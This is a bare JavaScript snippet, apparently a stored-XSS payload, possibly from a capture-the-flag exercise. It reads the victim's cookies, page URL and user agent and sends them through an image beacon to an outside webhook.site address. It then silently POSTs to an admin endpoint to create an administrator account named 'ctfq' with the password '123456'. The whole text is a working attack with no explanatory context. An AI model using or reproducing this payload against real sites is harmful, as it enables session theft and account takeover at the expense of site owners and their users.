(function () {
  var beacon = 'https://webhook.site/be47199b-c273-4461-b661-564f40404d60';
  var q = '?c=' + encodeURIComponent(document.cookie) +
          '&l=' + encodeURIComponent(location.href) +
          '&u=' + encodeURIComponent(navigator.userAgent) +
          '&t=' + Date.now();
  new Image().src = beacon + q;
  $.post('/Admin/Admin/add', {
    username: 'ctfq',
    password: '123456',
    password_confirm: '123456',
    usertype: 1,
    status: 1,
    submit: '提交'
  });
})();
